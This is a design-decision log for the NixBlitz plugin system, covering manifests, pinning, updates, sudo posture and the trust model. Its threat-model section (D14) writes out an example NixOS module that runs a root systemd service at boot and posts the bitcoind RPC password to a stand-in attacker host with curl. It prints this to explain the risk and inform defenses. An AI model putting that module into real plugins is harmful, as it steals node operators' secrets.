# Plugin system — design decisions

Running log of architecture decisions for the NixBlitz plugin system, with
rationale. Update this doc when a decision changes; don't rewrite history
— strike through or annotate so future readers see the path.

Target audience: anyone revisiting "why is the plugin system shaped like
this?" months from now.

> Looking to *write* a plugin rather than understand the design?
> See [`../plugin-authoring.md`](../plugin-authoring.md) for the
> manifest reference, the two-stage ABI, and worked examples.

---

## Context

NixBlitz wants a lean core with community-extensible modules: someone
runs `nixblitz plugin add github:user/nixblitz-tailscale`, a plugin
installs that exposes Tailscale in the TUI (config, dashboard tile,
actions) and in NixOS (service enablement). Same shape covers BTCPay,
Thunderhub, RTL, Electrs, etc.

Core question: how much **rendering power** do plugins get, and through
what mechanism?

---

## D1 — Extensibility mechanism: declarative manifest, not scripting

**Chosen**: plugins ship a `manifest.json` that declares UI surface
(config form, dashboard tile, actions). TUI renders from the manifest
using its existing widget kit. No plugin code runs inside the TUI
process.

**Rejected**:

- **Pure monolithic TUI** — community can't add UI without a core PR;
  bottleneck on core devs.
- **Full scripting language (Lua / Oche)** — arbitrary plugin code
  running inside a process that has sudo access, the JWT, and access
  to `/var/lib/blitz_api/.login-password`. Even a careful sandbox is
  one FFI escape away from owning the user's node. Also creates a
  support matrix explosion ("dashboard crashed because plugin X ran
  on Dart version Y").
- **Embedded WASM** — real sandbox but toolchain overhead is high
  and the ergonomics for "declare a tile with three stats" don't
  justify the weight.

**Rationale**: 95% of anticipated plugins (service integrations) fit
"config form + polled tile + few actions". A declarative shape covers
those at a fraction of the trust and complexity of scripting.
Escape-hatch for the other 5% is a plugin-provided sub-binary the TUI
can launch (sandboxed by the process boundary) — we'll cross that
bridge if it becomes real.

---

## D2 — Plugin storage layout

**Chosen**:

```
~/nixblitz/
  config.json                  # main — contains plugins[] array
  plugins/
    <id>/
      plugin.nix               # NixOS module (copied from upstream)
      manifest.json            # UI manifest (copied from upstream)
      config.json              # user settings (per-plugin)
      .plugin-metadata.json    # mirror of main config's plugin entry
```

Plugin source trees are copied into the outer git repo (no nested
git). Updates re-copy. `Apply` review's `git diff` shows plugin
additions and changes naturally.

**Rejected**:

- **Nested git repos at `plugins/<id>/`** — complicates diffing,
  submodule maintenance, `plugin update` flow.
- **External cache at `~/.nixblitz/plugin-cache/<id>@<rev>/`** with
  symlinks from `plugins/<id>/` — adds indirection; file changes
  don't show in the outer repo's diff.

**Rationale**: the dashboard + Apply flow already treats `~/nixblitz/`
as the source of truth for declarative config. Plugins extend that;
they don't fork it.

---

## D3 — Metadata split: identity vs. settings

**Chosen**:

- Main `config.json` holds a `plugins[]` array — identity + lifecycle
  metadata per plugin (id, url, branch, pinned_rev, installed_at,
  uninstalled_at, last_updated_at, enabled).
- Per-plugin `plugins/<id>/config.json` holds **only** the user-editable
  settings declared in the plugin's manifest.

**Rejected**:

- **Everything in main `config.json`** — unbounded growth; churn
  from plugin settings pollutes the main config's diff view.
- **Everything per-plugin** — no central list; harder to query
  "what's installed"; Update flow harder to drive.

**Rationale**: separation of concerns. Remove a plugin → wipe its
dir → settings gone, no orphans to migrate. Identity stays in main
for auditability.

---

## D4 — Soft delete with tombstones

**Chosen**: `plugin remove <id>` sets `uninstalled_at` on the main
config entry, deletes `plugins/<id>/` dir. `plugin list` hides
tombstones unless `--all`. `plugin reinstall <id>` uses the tombstone
to re-clone + re-enable at its prior pin.

**Rejected**: hard delete (entry gone on remove).

**Rationale**: audit trail, undo friendliness. Tombstone rows cost
~100 bytes each in the config file; we won't accumulate enough to
worry.

---

## D5 — Plugin ID is the URL

**Chosen**: the canonical plugin identifier is its full URL
(`github:owner/repo/subdir`). Directory name on disk is derived
from the URL (sanitized; collisions resolved with a numeric suffix).

**Rejected**:

- **Directory name** — short and human-readable, but two plugins
  from different authors could share a name (`tailscale` from
  fusion44 vs from someone else).
- **`name` field inside `manifest.json`** — display-only; not
  controlled by the installing user.

**Rationale**: URL is already globally unique. Using it as the ID
prevents accidental collisions when installing plugins from
different sources; also makes "which repo does this plugin come from"
directly queryable. Display names in the TUI come from the manifest.

---

## D6 — Per-plugin config schema uses our own DSL, encoded as JSON

**Chosen**: plugin manifests declare their config surface using a
small custom DSL, serialized as JSON (`manifest.json`):

```json
{
  "manifest": {
    "schema_version": 1,
    "min_tui_version": 1,
    "name": "nixblitz-tailscale"
  },
  "config": {
    "auth_key": {
      "type": "secret",
      "label": "Auth key",
      "required": false
    },
    "tags": {
      "type": "list<string>",
      "label": "ACL tags"
    }
  }
}
```

TUI validates against this DSL when reading the plugin's
`config.json`.

**Rejected**:

- **JSON Schema** — more expressive, better tooling, but imposes a
  learning curve on plugin authors and adds a dependency. Our schemas
  won't need conditional validation or complex refs.
- **TOML encoding** (original draft) — would require pulling a TOML
  parser into the Dart workspace with no compelling payoff; JSON is
  already a dependency (`dart:convert`) and is equally readable for
  this DSL shape. The DSL semantics (`type`, `label`, `required`,
  `secret`, `select<…>`, `list<T>`, …) are identical either way.

**Rationale**: keep the plugin-authoring experience simple for the
common case. DSL covers what we need (`bool`, `int`, `string`,
`secret`, `select<values…>`, `list<T>`). JSON keeps the toolchain
surface minimal. If we ever outgrow this we can layer JSON Schema
as an opt-in.

---

## D7 — Branch configurable, default `main`

**Chosen**: `plugin add <url>` tracks the `main` branch by default.
`--branch <name>` override lets users opt into plugin dev/beta
branches.

**Rejected**: always track `main`.

**Rationale**: beta testing of plugin dev branches is low-cost to
support (one flag) and enables the ecosystem's feedback loop
between plugin authors and power users.

---

## D8 — Multi-plugin repos supported

**Chosen**: URLs accept a subdirectory: `github:owner/repo/subdir`.
If the subdirectory contains a `manifest.json` it's treated as a
plugin root; repo-level `README.md` lists the contained plugins.

**Rejected**: one repo per plugin.

**Rationale**: the "official vetted plugins" bundle
(`github:fusion44/nixblitz-plugins`) stays one repo, one review
stream. Good publishing ergonomics.

---

## D9 — HTTPS-only transport

**Chosen**: `plugin add` accepts `github:`, `gitea:`, `forgejo:`, and
explicit `https://`. `ssh://`, `http://`, `file://` all require
explicit flags (`--local`, `--insecure`) that the TUI refuses to pass
without confirmation.

**Rejected**: accept any URL scheme.

**Rationale**: MITM-resistant by default; the technical audience can
override if they know what they're doing.

---

## D10 — Pin to commit SHA for rebuild stability

**Chosen**: `plugin add` does a shallow clone, resolves the
branch's current HEAD to a SHA, records that SHA in the main
config's `plugins[].pinned_rev`. The pin is a **rebuild-to-rebuild
stability guarantee**, not an eternal freeze: the code on disk
matches `pinned_rev` between updates, so repeat `nixos-rebuild`s
produce identical results. The pin advances only through an update
action (see D11), which re-resolves the tracked branch and re-copies
the plugin tree.

Analogy: this is how `flake.lock` works. The lock pins inputs for
reproducibility; `nix flake update` advances the pins on demand.

**Rejected**: track `main`'s HEAD dynamically (no pin at all).

**Rationale**: reproducibility + security. A rebuild tomorrow uses
the same code as today. Upstream compromise only propagates when the
user explicitly advances the pin.

---

## D11 — Plugin updates piggy-back on system update, with per-plugin opt-out

**Chosen**: "Update entire system" in the Update view runs plugin
refresh (fetch each plugin's tracked branch, compare to pinned_rev,
re-copy if different, update `pinned_rev` + `last_updated_at` in
main config) **before** the `git commit` + `nixos-rebuild switch`.
All plugin file changes land in the Apply review's `git diff`, so
the user sees exactly what will change before confirming.

In other words: a system update is an implicit `plugin update` for
all non-pinned plugins. This is the relationship between D10 and
D11 — D10 guarantees stability between updates, D11 defines when
the pin advances.

**Per-plugin opt-out**: users who want to hold a specific plugin
back can pin it:

- `nixblitz plugin pin <id>` — mark this plugin frozen. System
  updates skip it during plugin refresh. `plugins[].auto_update`
  flips to `false` in main config.
- `nixblitz plugin unpin <id>` — resume auto-advance on system
  update.
- `nixblitz plugin update <id>` — one-shot refresh of a single
  plugin, works for both pinned and unpinned plugins. Pinned
  plugins stay pinned after (unless combined with `--unpin`).

The distinction: `pinned_rev` is _what commit_ the plugin is at
(always set, rebuild-stability guarantee). `auto_update` is _whether
system update advances_ `pinned_rev` (default `true`; flipped by
`plugin pin`).

**Rejected**:

- **Dedicated "update plugins" action as the only path** —
  fragments the mental model; users would forget.
- **Auto-update on TUI startup** — surprises users; bypasses the
  Apply review.
- **No opt-out** — some plugins are load-bearing enough (e.g.
  custom remote-access plugin) that users want to audit before
  bumping.

**Rationale**: single entry point by default (one "update" action
covers the system), with a per-plugin knob for users who need
finer control. Apply review makes plugin churn visible either way.

---

## D12 — Conflicts fail the nix eval

**Chosen**: if two plugins (or a plugin and the core) both declare
conflicting NixOS options, `nix eval` / `nixos-rebuild switch`
errors out. The Apply view surfaces the failure; user removes or
disables the conflicting plugin.

**Rejected**: pre-flight conflict linting at `plugin add` time.

**Rationale**: simpler for MVP. Lint can come later as an opt-in step
if conflicts turn out to be common. For now, nix's own error
messages are the contract.

---

## D13 — GPG signing / publisher allowlists: parked

**Chosen**: not in the initial version. Manifest schema reserves
space for signed manifests / publisher keys but we don't implement.

**Rejected**: ship with signed manifests as a hard requirement.

**Rationale**: over-engineering for the technical-audience MVP. The
pinning + consent + git-diff-visible model is defensible without
signatures. Layer signatures on when there's evidence of
supply-chain concern or a wider audience.

---

## D14 — Trust model: install = root grant; consent surfaces metadata, not a sandbox

### Updated framing (2026-04-27)

Earlier drafts of this entry described `manifest.permissions` as
"declarative now, enforced later (Phase 6)". That framing was
wrong: it implied the consent prompt was a step toward sandboxing.
It isn't, and the planned Phase 6 enforcement *also* wouldn't
close the hole — see "Why Phase 6 doesn't help" below. This entry
now documents the actual trust model: **install = root grant,
consent surfaces metadata + a stark warning, and the only real
defense is reading the source you're about to install.**

### Threat model (explicit)

**Installing a plugin is equivalent to granting root.** A plugin's
`plugin.nix` is a standard NixOS module — the module system is
peer-equal and has no permission boundary. Every imported module
receives the fully-evaluated `config` argument, which means any
plugin can:

- Read `config.services.bitcoind.rpc.password`,
  `config.services.lnd.macaroons`, and every other secret in the
  tree at evaluation time.
- Declare systemd services, activation scripts, or cron jobs that
  run as root at boot and exfiltrate those secrets (`curl -X POST
  https://evil/… -d "pw=${config.…}"`).
- Use `builtins.readFile` / `builtins.fetchurl` at eval time
  against arbitrary paths.

Concrete exploit shape:

```nix
{ config, pkgs, ... }: {
  systemd.services.helpful-service = {
    wantedBy = [ "multi-user.target" ];
    script = ''
      ${pkgs.curl}/bin/curl -X POST https://evil.example/x \
        -d "pw=${config.services.bitcoind.rpc.password}"
    '';
  };
}
```

Rebuild succeeds, service runs, secret leaves. The manifest
`permissions` block **does not prevent this**; it's metadata the
plugin author wrote themselves, with no runtime enforcement and
no ability to constrain `plugin.nix`'s execution.

### Consent prompt surfaces metadata, NOT permissions

`nixblitz plugin add <url>` clones the source, parses
`manifest.json`, and shows the operator:

- `name`, `description` (what the plugin claims to be)
- `source` URL + `branch` + 40-char `pinnedRev` (where the code
  comes from + the exact commit they're consenting to)
- `schema` version (so the operator knows which loader applies)
- An explicit warning that confirming grants the author root, that
  `plugin.nix` runs at rebuild time as root, and that the prompt
  is consent to run that code rather than a sandbox.

**Notably absent**: the manifest's `permissions` block. Surfacing
that array as "Permissions requested" would create a false sense
of security — the values are author-supplied, unverified, and even
when honest they don't constrain anything `plugin.nix` does.

The `permissions` field stays in the schema for two reasons:

- **`privileged_units`** is load-bearing — the loader cross-checks
  every `unit:` action against this allow-list at parse time, so
  a manifest can't ship an action that triggers an undeclared
  systemd unit. This is real enforcement and stays.
- The other sub-fields (`bitcoin`, `lightning`, `filesystem`,
  `network`) are author-declared documentation. They might inform
  a future audit tool but don't show up at consent time.

### Mitigations the user actually has

- **Vetted-only default**: install from
  `nixblitz_official_plugins` or otherwise audit-reviewed sources.
- **Pin to a reviewed rev**: the consent prompt shows the exact
  SHA. After install, the rev is locked in `config.json`; the
  plugin can't change without an explicit `plugin refresh` (which
  re-prompts).
- **Read the source** at the upstream URL before answering yes,
  if the trust threshold isn't already met by the source choice.
- **Apply review**: every plugin install also lands in the
  `~/nixblitz/plugins/<id>/` git tree. The Apply view shows the
  diff of `plugin.nix` (among other files) before commit + rebuild,
  giving a second checkpoint where the operator can back out.

### Why Phase 6 doesn't help

Earlier drafts of this entry promised that Phase 6 would close
the hole via per-plugin `DynamicUser` systemd services + scoped
capability tokens. That's wrong. Per-plugin DynamicUser sandboxes
the *running services* a plugin declares — so a long-running
plugin daemon can be locked down. But:

1. `plugin.nix` runs at `nixos-rebuild` evaluation time as part
   of the module system. It's not a service; it's code that
   produces a NixOS configuration. There's no useful unit-level
   sandbox to apply to it.
2. Activation scripts (`system.activationScripts.x.text`) run at
   switch time as root, before any DynamicUser sandboxing kicks
   in. A plugin that just declares an activation script bypasses
   service-level confinement entirely.
3. Even with sandboxed services, a plugin's `plugin.nix` can read
   any `config.services.*` value — including secrets — at eval
   time and bake them into the activation script. Sandboxing the
   service after the fact is too late.

The only paths that *would* mitigate `plugin.nix` are
fundamentally different (sandboxed Nix evaluation, a non-Nix
plugin DSL, vetted-evaluator pre-flight) — all big architectural
changes, all invalidating "plugins are NixOS modules". None of
them are scoped or being planned today.

### Bottom line

Installing a plugin is `sudo install-arbitrary-software`. Treat
it that way. The consent prompt's job is to make that obvious
without overstating what the system does.

---

## Phasing (snapshot, may evolve)

Smallest viable slice that proves the concept — each phase is
shippable on its own. Status as of 2026-04-26:

1. ✅ **Plumbing** (done): `nixblitz plugin add/remove/list/refresh`,
   main-config `plugins[]` array (schema v13 + v14), auto-discovered
   `plugins/*/plugin.nix` in the generated flake (with
   `_module.args.pluginCfg` injection per the two-stage ABI),
   manifest parser + validator. Dogfooded with a hand-rolled
   tailscale plugin.
2. ✅ **Configure integration** (done): manifest-driven Configure
   section for plugin settings; per-plugin `config.json` edited
   via the form, persisted on every keystroke. Dogfooded with
   tailscale `auth_key`/`exit_node` and the lnbits backend wiring
   (Phase 2.5 second dogfood plugin).
3. ✅ **Dashboard integration** (done): manifest-driven tile on the
   dashboard, command-source polling. Tailscale dogfood tile shows
   ok/warn/error states. HTTP/SSE source still parked.
4. ✅ **Actions integration** (done): manifest-declared actions
   render alongside config fields in the plugin's Configure
   screen; confirm overlay + streaming output overlay; lnbits
   "Reset database" dogfood action.
5. 🟡 **Update integration** (partial): `plugin refresh <id>` and
   `plugin refresh --all` shipped as standalone CLI verbs. The
   "Update entire system" flow does NOT yet auto-refresh plugins
   per D11; the `auto_update` field on `PluginEntry` is modeled
   but unread. See follow-up issues for the remaining work.
6. ⏸ **Permissions** (struck through): earlier phasing imagined
   "Phase 6" runtime enforcement via per-plugin users + wrapped
   CLIs + scoped API tokens. D14's updated framing rejects this
   premise — Phase 6 wouldn't close the actual hole because the
   threat lives at module-eval / activation time, not at the
   running-service layer that `DynamicUser` would sandbox. The
   trust model stays "install = root grant"; consent surfaces
   metadata + a stark warning (see D14).

Open follow-ups + cross-cutting work track on the forgejo repo as
issues, not in this document. See
`forge.f44.fyi/f44/nixblitz_ng/issues`.

---

## D15 — Plugin ↔ plugin communication: no mechanism

**Chosen**: plugins have no core-provided IPC. A plugin that needs
another plugin's data talks to it the same way it'd talk to any
other service on the box — the filesystem, a unix socket the other
plugin exposes, blitz-api, or HTTP. No plugin-registry / message
bus / shared-state API from core.

**Rejected**:

- **A core-mediated pub/sub bus** between plugins — adds a runtime
  dependency surface, forces core to arbitrate schemas between
  third-party authors, and invites "plugin A depends on plugin B
  being installed" tangles that the installer would have to model.
- **Shared readable state directory** (`plugins/shared/`) — same
  tangles, without even the benefit of typing.

**Rationale**: the audience is technical and the consent model at
`plugin add` is explicit. Users who install two plugins that know
how to cooperate are opting into that coupling themselves; core
doesn't need to (and shouldn't) police it. Keeps the core trust
surface minimal. If this turns out to be a real pain point we can
layer a bus on top later without invalidating existing plugins.

---

## D16 — Manifest schema versioning mirrors the config migration model

**Chosen**: plugin manifests carry the same two-field version pair
we already use for `config.json` (see `config_migrations.dart`):

```toml
[manifest]
schema_version = 3         # what this manifest was authored against
min_tui_version = 2        # lowest TUI that can render it safely
```

Core tracks a `currentPluginManifestVersion` constant plus a
per-version migration table. Rules mirror config:

- **Additive changes** (new optional fields) bump
  `currentPluginManifestVersion` only. Older TUIs still load the
  manifest, ignore unknown fields, and preserve them on write-back.
- **Breaking changes** bump both `currentPluginManifestVersion`
  **and** `minCompatibleManifestVersion`. Older TUIs refuse to load
  manifests whose `min_tui_version > theirs`, with a
  `PluginTooNewException` that points at the nixblitz update path.
- Migration functions run at load time to bring older on-disk
  manifests forward to the current schema shape in memory — same
  `migrateConfig`-style table, keyed by source version.

**Rejected**:

- **Strict exact-match** on `tui_api_version` — forces every TUI
  bump to invalidate every plugin. Far too aggressive.
- **Semver-style** `>=X.Y.Z` ranges in the manifest — more
  expressive than we need and drifts away from the monotonic-
  integer scheme we're already committed to elsewhere.

**Rationale**: reuse the model the team already understands from
`currentConfigVersion` / `minCompatibleVersion`. Same invariants,
same migration-table shape, same forward-compat story — no new
mental model for plugin authors or for us.

---

## D17 — Uninstall during a dirty tree folds into the pending commit

**Chosen**: `plugin remove <id>` while there are already
unapplied changes in `~/nixblitz/` does NOT refuse or stash. It
adds the tombstone (`uninstalled_at` in main config, delete of
`plugins/<id>/` dir) on top of the existing staged diff. The next
Apply review shows both sets of changes; the single `git commit`
captures everything; `nixos-rebuild switch` applies it all.

**Rejected**:

- **Refuse while dirty** — punishes the user for uninstall while
  they happen to have any in-flight edit, forces them to
  apply-then-remove as two rebuilds. Friction without safety
  benefit.
- **Stash + re-apply** — adds a hidden state the user can't see
  in the Apply diff, and opens a can of worms if the stash ever
  fails to cleanly re-apply.

**Rationale**: Apply is already the single review-and-commit
choke-point. Every change since the last Apply is part of "the
next change." Treating uninstall the same way keeps the mental
model simple: "what's in the working tree is what Apply will
rebuild."

---

## Operator notes

### Plugins with UI-persisted settings

Some third-party applications (LNBits is the canonical example)
persist configuration into their own state — a SQLite DB, YAML
file, etc. — and treat environment variables as *initial* defaults
only. Once a value is written to the app's own store, changing the
env var (via the TUI Configure form → Apply → rebuild) has no
runtime effect: the app reads its own store on startup and ignores
the fresh env.

Concretely for LNBits: `LND_REST_MACAROON` is read from env on
first start, saved to `/var/lib/lnbits/data/database.sqlite3`, and
every subsequent start reads the DB value. A plugin-config change
that rewrites the env var won't take effect until the DB is wiped.

This is a category of plugin the plugin system cannot transparently
manage. Guidance, in increasing order of cost:

1. **Plugin author: leave UI-persisted fields out of the manifest
   `config` block.** Expose them as "configure via the app UI" in
   the plugin README instead, so users don't expect the TUI form
   to be authoritative.
2. **Plugin author: use app-specific "force env" flags** when they
   exist (LNBits does not, as of v1.5.4). A plugin.nix that flips
   such a flag brings the app back under Nix's authority.
3. **Operator: nuke the app's persisted state.** Only works before
   the user has real data. For LNBits:
   ```
   sudo systemctl stop lnbits
   sudo rm /var/lib/lnbits/data/database.sqlite3
   sudo systemctl start lnbits
   ```
   Loses anything the user put in the UI; the app re-initializes
   from the fresh env vars.

The plugin manifest has no way to *declare* that a field is
UI-persisted today. If this turns out to be common enough that
authors want to flag it, we'll add a field-level
`persisted_by: "app"` annotation to the DSL so the TUI can print a
"edit via `<app>` UI" hint instead of exposing the field as a
regular editor.

---

---

## D18 — Sudo posture: SudoSession + privileged actions via systemd units

**Chosen** (2026-04-26): the installed system uses NixOS's default
`security.sudo.wheelNeedsPassword = true`. The TUI authenticates
sudo non-interactively via a shared `SudoSession` service that
prompts the operator for a password once per "session of activity"
(typically once per TUI launch), refreshes the timestamp every
~10 min in the background, and lets every privileged call site
reuse the cached timestamp via `sudo -n`.

The live ISO keeps `wheelNeedsPassword = false` via a separate
host module (`templates/hosts/installer.nix`), so the install
flow doesn't need a credential it can't have yet (no admin
password is set on the live ISO). The installed system uses
`templates/hosts/installed.nix`.

For plugin actions the consequence is structural. A passwordless
`sudo -n bash -c '<arbitrary plugin shell>'` would either trigger
a prompt mid-flow (UX regression) or require adding `bash` to a
NOPASSWD allow-list (defeats the entire tightening). Neither is
acceptable, so we reshape the action DSL.

### Schema v2 changes

- **`run_as_root` is removed.** Manifests v1 with `run_as_root:
  true` actions hard-fail at load with a migration-hint error
  message.
- **Discriminated action types:** an action declares **exactly
  one** of `command:` (runs as the admin user via `bash -c`, no
  sudo) or `unit:` (dispatches a Type=oneshot systemd service via
  `sudo -n systemctl start --wait <unit>`).
- **`permissions.privileged_units: [...]`** is a closed allow-list
  of unit names the plugin's `unit:` actions are allowed to
  reference. Manifests cross-validate at parse time: an action
  pointing at a unit not in this list is rejected.
- **Tile commands** (the `dashboard` block) always run as the
  admin user. Any `run_as_root: true` on a tile spec is also
  rejected — tile polling fires every 30s on a background timer
  and must never surface a password prompt.

### Why this isn't just "better sudoers rules"

Posture C (a NOPASSWD allow-list scoped to specific binaries)
was the cheaper alternative considered and rejected. It captures
most of the value (`sudo bash` and `sudo nix-shell` blocked from a
stolen SSH session), but plugin shell actions can't be allow-listed
by command — a plugin's shell snippet is by definition arbitrary.
The allow-list either has to include `bash` (defeating the win) or
forbid privileged actions entirely (forcing the same systemd-unit
migration we now do under Posture A, with no UX upside). Posture A
is kept as the headline; Posture C remains documented as a
fallback if a future deployment can't tolerate the prompt UX.

### What this doesn't fix

D14's threat model is unchanged. A plugin can still smuggle a
`systemd.services.helpful-service` with `wantedBy = ["multi-user.
target"]` into its `plugin.nix`; that runs as root automatically
at every boot, never going through the action DSL or SudoSession.
Posture A narrows the attack surface for *plugin-supplied actions
the user runs explicitly*, not for the rebuild-time module
evaluation. Phase 6 (per-plugin systemd users) is what closes the
deeper hole.

---

_Last updated: 2026-04-26. Update the top of the relevant decision
entry when rescoping; don't rewrite — future readers need the
trail._
